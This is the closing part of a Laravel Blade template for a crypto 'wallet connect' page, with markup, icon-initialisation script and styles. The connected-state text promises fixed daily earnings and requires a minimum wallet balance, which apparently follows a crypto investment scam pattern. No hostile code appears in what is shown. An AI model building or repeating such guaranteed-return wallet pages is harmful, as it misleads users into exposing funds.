                            <i data-lucide="clock" class="w-5 h-5 sm:w-6 sm:h-6 text-purple-600"></i>
                        </div>
                        <h3 class="font-semibold text-gray-900 dark:text-white mb-1 sm:mb-2 text-sm sm:text-base">Instant Connection</h3>
                        <p class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 leading-relaxed">Quick setup process with immediate access to earning features</p>
                    </div>
                </div>
            </div>

        @else
            <!-- Wallet Connected State -->
            <div class="max-w-2xl mx-auto">
                <div class="bg-white dark:bg-gray-900 rounded-xl sm:rounded-2xl shadow-xl border border-gray-200 dark:border-gray-700 overflow-hidden">
                    <!-- Success Header -->
                    <div class="bg-gradient-to-r from-green-50 to-emerald-50 dark:from-green-900/20 dark:to-emerald-900/20 p-6 sm:p-8 border-b border-green-200 dark:border-green-700">
                        <div class="text-center">
                            <div class="w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-3 sm:mb-4 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center">
                                <i data-lucide="check-circle" class="w-8 h-8 sm:w-10 sm:h-10 text-green-600 dark:text-green-400"></i>
                            </div>
                            <h2 class="text-xl sm:text-2xl font-bold text-green-900 dark:text-green-100 mb-2 leading-tight">Wallet Successfully Connected!</h2>
                            <p class="text-green-700 dark:text-green-300 text-sm sm:text-base">Your wallet is connected and earning {{ $settings->currency }}{{ $settings->min_return }} daily</p>
                        </div>
                    </div>

                    <!-- Connected Info -->
                    <div class="p-6 sm:p-8">
                        <div class="grid sm:grid-cols-2 gap-4 sm:gap-6 mb-6 sm:mb-8">
                            <div class="text-center p-4 sm:p-6 bg-gray-50 dark:bg-gray-800 rounded-lg sm:rounded-xl">
                                <div class="text-xl sm:text-2xl font-bold text-gray-900 dark:text-white">{{ $settings->currency }}{{ $settings->min_return }}</div>
                                <div class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 mt-1">Daily Earnings</div>
                            </div>
                            <div class="text-center p-4 sm:p-6 bg-gray-50 dark:bg-gray-800 rounded-lg sm:rounded-xl">
                                <div class="text-xl sm:text-2xl font-bold text-gray-900 dark:text-white">{{ $settings->currency }}{{ $settings->min_balance }}</div>
                                <div class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 mt-1">Minimum Balance</div>
                            </div>
                        </div>

                        <!-- Status Message -->
                        <div class="bg-blue-50 dark:bg-blue-900/20 border-l-4 border-blue-400 p-3 sm:p-4 rounded-lg mb-6 sm:mb-8">
                            <div class="flex items-start">
                                <i data-lucide="info" class="h-4 w-4 sm:h-5 sm:w-5 text-blue-400 mt-0.5 mr-2 sm:mr-3 flex-shrink-0"></i>
                                <div class="text-xs sm:text-sm text-blue-700 dark:text-blue-300 leading-relaxed">
                                    <strong>Note:</strong> If you're not receiving earnings, ensure your wallet contains at least
                                    <strong>{{ $settings->currency }}{{ $settings->min_balance }}</strong> and contact our support team for assistance.
                                </div>
                            </div>
                        </div>

                        <!-- Action Buttons -->
                        <div class="grid sm:grid-cols-2 gap-3 sm:gap-4">
                            <a href="{{ route('dashboard') }}"
                               class="inline-flex items-center justify-center gap-2 py-3 px-4 bg-blue-600 hover:bg-blue-700 text-white rounded-lg sm:rounded-xl font-medium transition-all duration-200 text-sm sm:text-base">
                                <i data-lucide="bar-chart-3" class="w-4 h-4"></i>
                                View Dashboard
                            </a>
                            <a href="{{ route('contact') }}"
                               class="inline-flex items-center justify-center gap-2 py-3 px-4 bg-gray-100 hover:bg-gray-200 dark:bg-gray-800 dark:hover:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg sm:rounded-xl font-medium transition-all duration-200 text-sm sm:text-base">
                                <i data-lucide="help-circle" class="w-4 h-4"></i>
                                Get Support
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        @endif
    </div>
</div>

<script>
function walletConnectManager() {
    return {
        selectedWallet: '',
        walletAddress: null,
        isConnecting: false,
        showOtherWallets: false,
        hasError: false,

        init() {
            // Initialize Lucide icons immediately
            this.refreshIcons();

            // Also refresh icons after a short delay to ensure DOM is ready
            setTimeout(() => {
                this.refreshIcons();
            }, 100);

            // Reset connecting state after timeout as fallback
            setTimeout(() => {
                this.isConnecting = false;
            }, 15000); // 15 seconds timeout
        },

        refreshIcons() {
            if (typeof lucide !== 'undefined') {
                try {
                    lucide.createIcons();
                } catch (e) {
                    console.log('Lucide icons initialization:', e);
                }
            }
        },

        selectWallet(wallet) {
            this.selectedWallet = wallet;
            this.showOtherWallets = false;
            this.$nextTick(() => {
                this.refreshIcons();
            });
        },

        get isValidAddress() {
            return typeof this.walletAddress === 'string' && this.walletAddress.trim().length > 0;
        }    }
}

// Initialize Lucide icons when DOM loads
document.addEventListener('DOMContentLoaded', function() {
    // Multiple initialization attempts to ensure icons load
    function initIcons() {
        if (typeof lucide !== 'undefined') {
            try {
                lucide.createIcons();
                console.log('Lucide icons initialized successfully');
            } catch (e) {
                console.log('Lucide error:', e);
            }
        } else {
            console.log('Lucide not found, retrying...');
            setTimeout(initIcons, 200);
        }
    }

    initIcons();

    // Also reinitialize when Alpine.js is ready
    document.addEventListener('alpine:init', function() {
        setTimeout(initIcons, 100);
    });
});

// Reinitialize icons when page becomes visible (for PWA/tab switching)
document.addEventListener('visibilitychange', function() {
    if (!document.hidden && typeof lucide !== 'undefined') {
        setTimeout(() => {
            lucide.createIcons();
        }, 100);
    }
});
</script>


<style>
/* AGROTRADE_WALLET_SELECTOR_V2 */
[x-cloak] { display:none!important; }
.aw2-trigger {display:flex;align-items:center;justify-content:space-between;gap:12px;padding:13px 16px;border:1px solid #4771b0;border-radius:12px;background:#1e293b;color:#f8fafc;cursor:pointer;min-height:50px}
.aw2-trigger:focus-visible {outline:2px solid #60a5fa;outline-offset:2px}
.aw2-menu {max-height:360px;overflow-y:auto;overscroll-behavior:contain;background:#111b2b;border:1px solid #385274;border-radius:12px;padding:8px;margin-top:8px;box-shadow:0 16px 35px rgba(0,0,0,.2)}
.aw2-group {font-size:12px;font-weight:700;letter-spacing:.04em;color:#93a9c7;padding:14px 10px 7px;border-top:1px solid #26354a}
.aw2-group:first-child {border-top:0;padding-top:8px}
.aw2-option {width:100%;display:flex;align-items:center;gap:12px;padding:9px 12px;color:#e2e8f0;background:transparent;border:1px solid transparent;border-radius:9px;text-align:left;cursor:pointer}
.aw2-option:hover,.aw2-option:focus-visible {background:#223652;outline:none}
.aw2-option.aw2-active {border-color:#3b82f6;background:#18355a}
.aw2-icon {width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:9px;background:#26364c;flex-shrink:0}
.aw2-icon img {width:25px;height:25px;object-fit:contain}
.aw2-fallback {font-size:12px;font-weight:700;color:#bfdbfe}
.aw2-name {flex:1;font-size:14px;font-weight:600}
.aw2-check {color:#60a5fa}
</style>
@endsection
